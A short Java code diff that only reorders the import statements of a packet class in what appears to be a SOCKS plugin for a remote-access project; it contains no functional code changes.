@@ -1,11 +1,11 @@
 package jrat.plugin.socks.client;
 
-import java.io.DataInputStream;
-import java.io.DataOutputStream;
-
 import jrat.api.Client;
 import jrat.api.net.PacketBuilder;
 import jrat.plugins.socks.Global;
+
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
 
 public class Packet118Start extends PacketBuilder {
 	
